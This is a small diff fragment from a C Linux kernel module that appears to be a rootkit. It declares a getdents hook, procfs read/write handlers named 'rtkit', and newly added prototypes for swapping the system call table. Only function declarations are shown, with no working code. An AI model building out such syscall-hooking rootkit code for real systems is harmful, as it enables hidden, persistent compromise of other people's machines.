@@ -91,6 +91,8 @@ asmlinkage long custom_getdents(unsigned int fd,
 								unsigned int count);
 static int procfs_init(void);
 static void procfs_clean(void);
+static void new_systable(void);
+static void old_systable(void);
 static ssize_t rtkit_read(struct file *file, char __user *buffer,
 													size_t count, loff_t *ppos);
 static ssize_t rtkit_write(struct file *file, const char __user *buffer,
